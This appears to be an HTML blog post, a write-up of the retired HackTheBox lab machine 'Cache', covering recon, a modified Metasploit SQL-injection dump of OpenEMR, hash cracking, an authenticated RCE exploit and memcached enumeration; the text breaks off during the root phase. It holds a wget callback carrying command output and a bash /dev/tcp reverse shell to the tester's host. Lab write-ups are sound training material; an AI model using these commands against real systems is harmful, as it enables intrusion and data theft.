@@ -1,0 +1,953 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Cache | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2020/10/htb-cache.html" title="Read more" class="entry-title-link">
+                HTB: Cache</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2020-10-10T18:05:00+02:00">10 Oct 2020</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="../../tag/linux.html" title="Read more with the label Linux" class="meta-link">Linux</a> 
+          <a href="../../tag/openemr.html" title="Read more with the label openEMR" class="meta-link">openEMR</a> 
+          <a href="../../tag/docker.html" title="Read more with the label docker" class="meta-link">docker</a> 
+          <a href="../../tag/memcache.html" title="Read more with the label memcache" class="meta-link">memcache</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 12 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2020.10/cache_card.png" alt="Cache card" width="262"></p>
+<p>This is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/251">Cache</a> created by
+<a href="https://www.hackthebox.eu/home/users/profile/23227">ASHacker</a> and publish on
+May 9, 2020.
+This box is classified as a medium machine. The user part is the harder as it
+involve some enumeration, chaining two exploit for
+<a href="https://www.open-emr.org/">openEMR</a>. The root part is
+quit easier as it was a simple "exploitation" the box's <code>memcache</code> and the
+docker permissions.</p>
+
+
+<h1 id="user">User</h1>
+<h2 id="recon">Recon</h2>
+<p>We start with an nmap scan. Only port 22 (SSH) and 80 (HTTP) are open.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Sat May 16 03:28:10 2020 as: nmap -p- -sSV -oN nmap 10.10.10.188</span>
+<span class="code-line">Nmap scan report for 10.10.10.188</span>
+<span class="code-line">Host is up (0.013s latency).</span>
+<span class="code-line">Not shown: 65533 closed ports</span>
+<span class="code-line">PORT   STATE SERVICE VERSION</span>
+<span class="code-line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span>
+<span class="code-line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span>
+<span class="code-line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+<span class="code-line"></span>
+<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="code-line"># Nmap done at Sat May 16 03:37:19 2020 -- 1 IP address (1 host up) scanned in 549.65 seconds</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="web">Web</h2>
+<p>We look at the website. The homepage is describing the different type of hacker
+(<em>sic</em>) (red hats really?).</p>
+<p><img alt="Cache home page" src="/media/2020.10/cache_01.png"></p>
+<p>There is a login page.</p>
+<p><img alt="Cache login page" src="/media/2020.10/cache_02.png"></p>
+<p>When we try to login we see in Burp that there is no request sent.
+We look at the JavaScript files loaded by the page and mostly at the file
+<code>functionality.js</code> located at <code>http://cache.htb/jquery/functionality.js</code>. The
+file contain the credentials for the login form: <code>ash:H@v3_fun</code></p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="nx">$</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="kd">var</span> <span class="nx">error_correctPassword</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span></span>
+<span class="code-line">    <span class="kd">var</span> <span class="nx">error_username</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="kd">function</span> <span class="nx">checkCorrectPassword</span><span class="p">(){</span></span>
+<span class="code-line">        <span class="kd">var</span> <span class="nx">Password</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#password&quot;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span></span>
+<span class="code-line">        <span class="k">if</span><span class="p">(</span><span class="nx">Password</span> <span class="o">!=</span> <span class="s1">&#39;H@v3_fun&#39;</span><span class="p">){</span></span>
+<span class="code-line">            <span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Password didn&#39;t Match&quot;</span><span class="p">);</span></span>
+<span class="code-line">            <span class="nx">error_correctPassword</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span></span>
+<span class="code-line">        <span class="p">}</span></span>
+<span class="code-line">    <span class="p">}</span></span>
+<span class="code-line">    <span class="kd">function</span> <span class="nx">checkCorrectUsername</span><span class="p">(){</span></span>
+<span class="code-line">        <span class="kd">var</span> <span class="nx">Username</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#username&quot;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span></span>
+<span class="code-line">        <span class="k">if</span><span class="p">(</span><span class="nx">Username</span> <span class="o">!=</span> <span class="s2">&quot;ash&quot;</span><span class="p">){</span></span>
+<span class="code-line">            <span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Username didn&#39;t Match&quot;</span><span class="p">);</span></span>
+<span class="code-line">            <span class="nx">error_username</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span></span>
+<span class="code-line">        <span class="p">}</span></span>
+<span class="code-line">    <span class="p">}</span></span>
+<span class="code-line">    <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#loginform&quot;</span><span class="p">).</span><span class="nx">submit</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span></span>
+<span class="code-line">        <span class="cm">/* Act on the event */</span></span>
+<span class="code-line">        <span class="nx">error_correctPassword</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span></span>
+<span class="code-line">        <span class="nx">checkCorrectPassword</span><span class="p">();</span></span>
+<span class="code-line">        <span class="nx">error_username</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span></span>
+<span class="code-line">        <span class="nx">checkCorrectUsername</span><span class="p">();</span></span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">        <span class="k">if</span><span class="p">(</span><span class="nx">error_correctPassword</span> <span class="o">==</span> <span class="kc">false</span> <span class="o">&amp;&amp;</span> <span class="nx">error_username</span> <span class="o">==</span><span class="kc">false</span><span class="p">){</span></span>
+<span class="code-line">            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span></span>
+<span class="code-line">        <span class="p">}</span></span>
+<span class="code-line">        <span class="k">else</span><span class="p">{</span></span>
+<span class="code-line">            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span></span>
+<span class="code-line">        <span class="p">}</span></span>
+<span class="code-line">    <span class="p">});</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="p">});</span></span>
+<span class="code-line"></code></pre></div>
+
+<p><strong>Note:</strong> the page is also directly accessible without authentication. Some JavaScript on the body tag will make you go back to the login page if you don't have the right <code>referer</code>.</p>
+<p>The page is just under construction and there is not a much to do.</p>
+<p><img alt="Page under construction" src="/media/2020.10/cache_03.png"></p>
+<p>We read the author's page again and focus on its other project: HMS.</p>
+<p>We modify our /etc/hosts to add the hms.htb domain (still on the same IP address).
+We can then browser to the page and get a authentication form for
+<a href="https://www.open-emr.org/">openEMR</a>.
+The previously find credentials are not working..</p>
+<p><img alt="Page under construction" src="/media/2020.10/cache_04.png"></p>
+<p>We run a <code>dirb</code> against this new domain and found a <code>admin.php</code> file.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>dirb http://hms.htb</span>
+<span class="code-line"></span>
+<span class="code-line">-----------------</span>
+<span class="code-line">DIRB v2.22</span>
+<span class="code-line">By The Dark Raver</span>
+<span class="code-line">-----------------</span>
+<span class="code-line"></span>
+<span class="code-line">START_TIME: Sat May 16 04:43:49 2020</span>
+<span class="code-line">URL_BASE: http://hms.htb/</span>
+<span class="code-line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span>
+<span class="code-line"></span>
+<span class="code-line">-----------------</span>
+<span class="code-line"></span>
+<span class="code-line">GENERATED WORDS: 4612</span>
+<span class="code-line"></span>
+<span class="code-line">---- Scanning URL: http://hms.htb/ ----</span>
+<span class="code-line">+ http://hms.htb/admin.php (CODE:200|SIZE:937)</span>
+<span class="code-line">==&gt; DIRECTORY: http://hms.htb/common/</span>
+<span class="code-line">==&gt; DIRECTORY: http://hms.htb/config/</span>
+<span class="code-line"></code></pre></div>
+
+<p>We cannot do much with this admin page but it disclose us the exact version of
+openEMR used.</p>
+<p><img alt="Page under construction" src="/media/2020.10/cache_05.png"></p>
+<p>We use <code>searchsploit</code> in order to find an exploit for our version but all of
+them are authenticated.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~/$ searchsploit openemr  5.0.1 </span>
+<span class="code-line">------------------------------------------------------------ ---------------------------------</span>
+<span class="code-line">Exploit Title                                              |  Path</span>
+<span class="code-line">------------------------------------------------------------ ---------------------------------</span>
+<span class="code-line">OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions    | linux/webapps/45202.txt</span>
+<span class="code-line">OpenEMR &lt; 5.0.1 - (Authenticated) Remote Code Execution     | php/webapps/45161.py</span>
+<span class="code-line">OpenEMR &lt; 5.0.1 - (Authenticated) Remote Code Execution     | php/webapps/45161.py</span>
+<span class="code-line">------------------------------------------------------------ ---------------------------------</span>
+<span class="code-line">Shellcodes: No Results</span>
+<span class="code-line"></code></pre></div>
+
+<p>We launch metasploit and search of openEMR exploit. We found a SQL injection
+dump exploit.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>msf5 &gt; search openemr</span>
+<span class="code-line"></span>
+<span class="code-line">Matching Modules</span>
+<span class="code-line">================</span>
+<span class="code-line"></span>
+<span class="code-line">  #  Name                                             Disclosure Date  Rank       Check  Description</span>
+<span class="code-line">  -  ----                                             ---------------  ----       -----  -----------</span>
+<span class="code-line">  0  auxiliary/sqli/openemr/openemr_sqli_dump         2019-05-17       normal     Yes    OpenEMR 5.0.1 Patch 6 SQLi Dump</span>
+<span class="code-line">  1  exploit/unix/webapp/openemr_sqli_privesc_upload  2013-09-16       excellent  Yes    OpenEMR 4.1.1 Patch 14 SQLi Privilege Escalation Remote Code Execution</span>
+<span class="code-line">  2  exploit/unix/webapp/openemr_upload_exec          2013-02-13       excellent  Yes    OpenEMR PHP File Upload Vulnerability</span>
+<span class="code-line"></code></pre></div>
+
+<p>We configure the different option, especially the <code>vhost</code> and run the exploit.
+We quickly get some result and it start to dump the first table out of 295… 295!
+This will take forever.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>msf5 auxiliary(sqli/openemr/openemr_sqli_dump) &gt; show options</span>
+<span class="code-line"></span>
+<span class="code-line">Module options (auxiliary/sqli/openemr/openemr_sqli_dump):</span>
+<span class="code-line"></span>
+<span class="code-line">  Name       Current Setting  Required  Description</span>
+<span class="code-line">  ----       ---------------  --------  -----------</span>
+<span class="code-line">  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span>
+<span class="code-line">  RHOSTS     10.10.10.188     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span>
+<span class="code-line">  RPORT      80               yes       The target port (TCP)</span>
+<span class="code-line">  SSL        false            no        Negotiate SSL/TLS for outgoing connections</span>
+<span class="code-line">  TARGETURI  /                yes       The base path to the OpenEMR installation</span>
+<span class="code-line">  VHOST      hms.htb          no        HTTP server virtual host</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">msf5 auxiliary(sqli/openemr/openemr_sqli_dump) &gt; run</span>
+<span class="code-line">[*] Running module against 10.10.10.188</span>
+<span class="code-line"></span>
+<span class="code-line">[*] DB Version: 5.7.30-0ubuntu0.18.04.1</span>
+<span class="code-line">[*] Enumerating tables, this may take a moment...</span>
+<span class="code-line">[*] Identified 295 tables.</span>
+<span class="code-line">[*] Dumping table (1/295): CHARACTER_SETS</span>
+<span class="code-line">^C[-] Stopping running against current target...</span>
+<span class="code-line">[*] Control-C again to force quit all targets.</span>
+<span class="code-line"></code></pre></div>
+
+<p>We grab the exploit code on <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/sqli/openemr/openemr_sqli_dump.rb">rapid7 github</a>
+and rewrite the <code>dump_all</code> module in order to just list the different tables (we
+just comment the lines dumping and saving the tables).</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>  <span class="k">def</span> <span class="nf">dump_all</span></span>
+<span class="code-line">    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;version()&#39;</span></span>
+<span class="code-line">    <span class="n">db_version</span> <span class="o">=</span> <span class="n">exec_payload_and_parse</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">print_status</span><span class="p">(</span><span class="s2">&quot;DB Version: </span><span class="si">#{</span><span class="n">db_version</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">print_status</span><span class="p">(</span><span class="s1">&#39;Enumerating tables, this may take a moment...&#39;</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">tables</span> <span class="o">=</span> <span class="n">enumerate_tables</span></span>
+<span class="code-line">    <span class="n">num_tables</span> <span class="o">=</span> <span class="n">tables</span><span class="o">.</span><span class="n">length</span></span>
+<span class="code-line">    <span class="n">print_status</span><span class="p">(</span><span class="s2">&quot;Identified </span><span class="si">#{</span><span class="n">num_tables</span><span class="si">}</span><span class="s2"> tables.&quot;</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="c1"># These tables are impossible to fetch because they increase each request</span></span>
+<span class="code-line">    <span class="n">skiptables</span> <span class="o">=</span> <span class="sx">%w[form_taskman log log_comment_encrypt]</span></span>
+<span class="code-line">    <span class="n">tables</span><span class="o">.</span><span class="n">each_with_index</span> <span class="k">do</span> <span class="o">|</span><span class="n">table</span><span class="p">,</span> <span class="n">i</span><span class="o">|</span></span>
+<span class="code-line">      <span class="k">if</span> <span class="n">skiptables</span><span class="o">.</span><span class="n">include?</span><span class="p">(</span><span class="n">table</span><span class="p">)</span></span>
+<span class="code-line">        <span class="n">print_status</span><span class="p">(</span><span class="s2">&quot;Skipping table (</span><span class="si">#{</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="s2">/</span><span class="si">#{</span><span class="n">num_tables</span><span class="si">}</span><span class="s2">): </span><span class="si">#{</span><span class="n">table</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span></span>
+<span class="code-line">      <span class="k">else</span></span>
+<span class="code-line">        <span class="n">print_status</span><span class="p">(</span><span class="s2">&quot;Dumping table (</span><span class="si">#{</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="s2">/</span><span class="si">#{</span><span class="n">num_tables</span><span class="si">}</span><span class="s2">): </span><span class="si">#{</span><span class="n">table</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span></span>
+<span class="code-line">        <span class="c1">#table_data = walk_table(table)</span></span>
+<span class="code-line">        <span class="c1">#save_csv(table_data, table)</span></span>
+<span class="code-line">      <span class="k">end</span></span>
+<span class="code-line">    <span class="k">end</span></span>
+<span class="code-line">    <span class="n">print_status</span><span class="p">(</span><span class="s2">&quot;Dumped all tables to </span><span class="si">#{</span><span class="no">Msf</span><span class="o">::</span><span class="no">Config</span><span class="o">.</span><span class="n">loot_directory</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span></span>
+<span class="code-line">  <span class="k">end</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>We load our
+<a href="https://github.com/rapid7/metasploit-framework/wiki/Running-Private-Modules">private msf module</a>
+configure it and run it.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>msf5 auxiliary(test/openemr_sqli_dump) &gt; run</span>
+<span class="code-line">[*] Running module against 10.10.10.188</span>
+<span class="code-line"></span>
+<span class="code-line">[*] DB Version: 5.7.30-0ubuntu0.18.04.1</span>
+<span class="code-line">[*] Enumerating tables, this may take a moment...</span>
+<span class="code-line">[*] Identified 295 tables.</span>
+<span class="code-line">[*] Dumping table (1/295): CHARACTER_SETS</span>
+<span class="code-line">&lt;snip&gt;</span>
+<span class="code-line">[*] Dumping table (284/295): therapy_groups_counselors</span>
+<span class="code-line">[*] Dumping table (285/295): therapy_groups_participant_attendance</span>
+<span class="code-line">[*] Dumping table (286/295): therapy_groups_participants</span>
+<span class="code-line">[*] Dumping table (287/295): transactions</span>
+<span class="code-line">[*] Dumping table (288/295): user_settings</span>
+<span class="code-line">[*] Dumping table (289/295): users</span>
+<span class="code-line">[*] Dumping table (290/295): users_facility</span>
+<span class="code-line">[*] Dumping table (291/295): users_secure</span>
+<span class="code-line">[*] Dumping table (292/295): valueset</span>
+<span class="code-line">[*] Dumping table (293/295): version</span>
+<span class="code-line">[*] Dumping table (294/295): voids</span>
+<span class="code-line">[*] Dumping table (295/295): x12_partners</span>
+<span class="code-line"></code></pre></div>
+
+<p>We quickly look at the table structure on the <a href="https://www.open-emr.org/wiki/index.php/Database_Structure">openEMR wiki</a>
+and dump the table <code>users</code> with the index 288 (yes the table index start at 0).</p>
+<p>It contains nothing interesting as the users' password where moved into the
+<code>users_secure</code> table (an attentive reading of the wiki page will had give us
+that immediately).</p>
+<p>We re-wrote our personal module in order to dump the table <code>users_secure</code> with
+the index 290. The <code>dump_all</code> function now looks like the following:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>  <span class="k">def</span> <span class="nf">dump_all</span></span>
+<span class="code-line">    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;version()&#39;</span></span>
+<span class="code-line">    <span class="n">db_version</span> <span class="o">=</span> <span class="n">exec_payload_and_parse</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">print_status</span><span class="p">(</span><span class="s2">&quot;DB Version: </span><span class="si">#{</span><span class="n">db_version</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span></span>
+<span class="code-line">      <span class="n">print_status</span><span class="p">(</span><span class="s2">&quot;version 2&quot;</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">print_status</span><span class="p">(</span><span class="s1">&#39;Enumerating tables, this may take a moment...&#39;</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">tables</span> <span class="o">=</span> <span class="n">enumerate_tables</span></span>
+<span class="code-line">    <span class="n">num_tables</span> <span class="o">=</span> <span class="n">tables</span><span class="o">.</span><span class="n">length</span></span>
+<span class="code-line">    <span class="n">print_status</span><span class="p">(</span><span class="s2">&quot;Identified </span><span class="si">#{</span><span class="n">num_tables</span><span class="si">}</span><span class="s2"> tables.&quot;</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="c1"># These tables are impossible to fetch because they increase each request</span></span>
+<span class="code-line">    <span class="n">skiptables</span> <span class="o">=</span> <span class="sx">%w[form_taskman log log_comment_encrypt]</span></span>
+<span class="code-line">    <span class="n">tables</span><span class="o">.</span><span class="n">each_with_index</span> <span class="k">do</span> <span class="o">|</span><span class="n">table</span><span class="p">,</span> <span class="n">i</span><span class="o">|</span></span>
+<span class="code-line">      <span class="k">if</span> <span class="n">skiptables</span><span class="o">.</span><span class="n">include?</span><span class="p">(</span><span class="n">table</span><span class="p">)</span></span>
+<span class="code-line">        <span class="n">print_status</span><span class="p">(</span><span class="s2">&quot;Skipping table (</span><span class="si">#{</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="s2">/</span><span class="si">#{</span><span class="n">num_tables</span><span class="si">}</span><span class="s2">): </span><span class="si">#{</span><span class="n">table</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span></span>
+<span class="code-line">      <span class="k">else</span></span>
+<span class="code-line">          <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">290</span></span>
+<span class="code-line">            <span class="n">print_status</span><span class="p">(</span><span class="s2">&quot;Dumping table (</span><span class="si">#{</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="s2">/</span><span class="si">#{</span><span class="n">num_tables</span><span class="si">}</span><span class="s2">): </span><span class="si">#{</span><span class="n">table</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span></span>
+<span class="code-line">            <span class="n">table_data</span> <span class="o">=</span> <span class="n">walk_table</span><span class="p">(</span><span class="n">table</span><span class="p">)</span></span>
+<span class="code-line">            <span class="n">save_csv</span><span class="p">(</span><span class="n">table_data</span><span class="p">,</span> <span class="n">table</span><span class="p">)</span></span>
+<span class="code-line">        <span class="k">end</span></span>
+<span class="code-line">      <span class="k">end</span></span>
+<span class="code-line">    <span class="k">end</span></span>
+<span class="code-line">    <span class="n">print_status</span><span class="p">(</span><span class="s2">&quot;Dumped all tables to </span><span class="si">#{</span><span class="no">Msf</span><span class="o">::</span><span class="no">Config</span><span class="o">.</span><span class="n">loot_directory</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span></span>
+<span class="code-line">  <span class="k">end</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>We rerun our module and get the looted data, this time we have the username and
+a password hash!</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~/$ cat /home/kali/.msf4/loot/20200516080433_default_10.10.10.188_openemr.users_se_390635.csv</span>
+<span class="code-line">id,username,password,salt,last_update,password_history1,salt_history1,password_history2,salt_history2</span>
+<span class="code-line">1,openemr_admin,$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.,$2a$05$l2sTLIG6GTBeyBf7TAKL6A$,2019-11-21 06:38:40,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;</span>
+<span class="code-line"></code></pre></div>
+
+<p>We load the has inside <code>john</code> the ripper and quickly get the password <code>xxxxxx</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ john hash</span>
+<span class="code-line">Warning: detected hash type &quot;bcrypt&quot;, but the string is also recognized as &quot;bcrypt-opencl&quot;</span>
+<span class="code-line">Use the &quot;--format=bcrypt-opencl&quot; option to force loading these as that type instead</span>
+<span class="code-line">Using default input encoding: UTF-8</span>
+<span class="code-line">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span>
+<span class="code-line">Cost 1 (iteration count) is 32 for all loaded hashes</span>
+<span class="code-line">Will run 8 OpenMP threads</span>
+<span class="code-line">Proceeding with single, rules:Single</span>
+<span class="code-line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span>
+<span class="code-line">Almost done: Processing the remaining buffered candidate passwords, if any.</span>
+<span class="code-line">Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span>
+<span class="code-line">xxxxxx           (?)</span>
+<span class="code-line">1g 0:00:00:00 DONE 2/3 (2020-05-16 14:07) 4.347g/s 5008p/s 5008c/s 5008C/s stinky..88888888</span>
+<span class="code-line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span>
+<span class="code-line">Session completed</span>
+<span class="code-line"></code></pre></div>
+
+<p>We can now connect on OpenEMR using our credentials <code>openemr_admin:xxxxxx</code>.</p>
+<p><img alt="OpenEMR authenticated" src="/media/2020.10/cache_06.png"></p>
+<p>We then fireup the authenticated exploit for openEMR found previously. At the
+same time we start a simple Python HTTP server in order to check our RCE. It
+works.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$python ./45161.py &#39;http://hms.htb&#39; -u openemr_admin -p xxxxxx -c &#39;wget http://10.10.14.156:8081/$(id)t 0&gt;&amp;1&#39;</span>
+<span class="code-line"></span>
+<span class="code-line">$python3 -m http.server 8081</span>
+<span class="code-line">Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...</span>
+<span class="code-line">10.10.10.188 - - [16/May/2020 08:44:58] code 404, message File not found</span>
+<span class="code-line">10.10.10.188 - - [16/May/2020 08:44:58] &quot;GET /uid=33(www-data) HTTP/1.1&quot; 404 -</span>
+<span class="code-line"></code></pre></div>
+
+<p>We change our payload in order to get a reverse shell. We launch a <code>netcat</code> to
+catch our reverse shell.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$python ./45161.py &#39;http://hms.htb&#39; -u openemr_admin -p xxxxxx -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.156/4242 0&gt;&amp;1&#39;</span>
+<span class="code-line"></span>
+<span class="code-line">$nc -l -p 4242</span>
+<span class="code-line">bash: cannot set terminal process group (2504): Inappropriate ioctl for device</span>
+<span class="code-line">bash: no job control in this shell</span>
+<span class="code-line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ whoami</span>
+<span class="code-line">whoami</span>
+<span class="code-line">www-data</span>
+<span class="code-line"></code></pre></div>
+
+<p>We use python in order to get a better shell. And switch user to <code>ash</code> reusing
+the password found in the JavaScript file. This allow us to get to the
+<code>user.txt</code> flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>www-data@cache:/var/www/hms.htb/public_html/interface/main$ python3 -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
+<span class="code-line">$ su ash</span>
+<span class="code-line">su ash</span>
+<span class="code-line">Password: H@v3_fun</span>
+<span class="code-line"></span>
+<span class="code-line">ash@cache:/var/www/hms.htb/public_html/interface/main$ cd</span>
+<span class="code-line">cd</span>
+<span class="code-line">  ash@cache:~$ cat user.txt</span>
+<span class="code-line">cat user.txt</span>
+<span class="code-line">a3014a6da5ebe33cd897b66b44397ef1</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="root">Root</h1>
+<p>We use <a href="https://github.com/DominicBreuker/pspy">pspy</a> to enumerate the running
+process. We see that a few process are running especially <code>dockerd</code> and
+<code>memecached</code>. Given the name of the box is certain that the <code>memcached</code> process
+is involved.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>www-data@cache:/tmp/.plop$ ./pspy64</span>
+<span class="code-line">./pspy64</span>
+<span class="code-line">&lt;snip&gt;</span>
+<span class="code-line">done</span>
+<span class="code-line">2020/05/16 16:16:33 CMD: UID=103  PID=994    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only </span>
+<span class="code-line">2020/05/16 16:16:33 CMD: UID=0    PID=992    | /usr/sbin/cron -f </span>
+<span class="code-line">2020/05/16 16:16:33 CMD: UID=0    PID=977    | /usr/bin/dockerd -H fd:// </span>
+<span class="code-line">2020/05/16 16:16:33 CMD: UID=0    PID=969    | /usr/lib/accountsservice/accounts-daemon </span>
+<span class="code-line">2020/05/16 16:16:33 CMD: UID=111  PID=964    | /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid </span>
+<span class="code-line">2020/05/16 16:16:33 CMD: UID=0    PID=961    | /usr/bin/VGAuthService </span>
+<span class="code-line">2020/05/16 16:16:33 CMD: UID=0    PID=96     |</span>
+<span class="code-line"></code></pre></div>
+
+<p>A few Google search lead us to an article about
+<a href="https://www.hackingarticles.in/penetration-testing-on-memcached-server/">testing memcached</a>.
+We connect to the service using telnet. We list the item available, get the
+<code>user</code> and the <code>passwd</code> items.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>www-data@cache:/var/cache/apt$ telnet 127.0.0.1 11211</span>
+<span class="code-line">telnet 127.0.0.1 11211</span>
+<span class="code-line">Trying 127.0.0.1...</span>
+<span class="code-line">Connected to 127.0.0.1.</span>
+<span class="code-line">Escape character is &#39;^]&#39;.</span>
+<span class="code-line">stats cachedump 1 0</span>
+<span class="code-line">ITEM link [21 b; 0 s]</span>
+<span class="code-line">ITEM user [5 b; 0 s]</span>
+<span class="code-line">ITEM passwd [9 b; 0 s]</span>
+<span class="code-line">ITEM file [7 b; 0 s]</span>
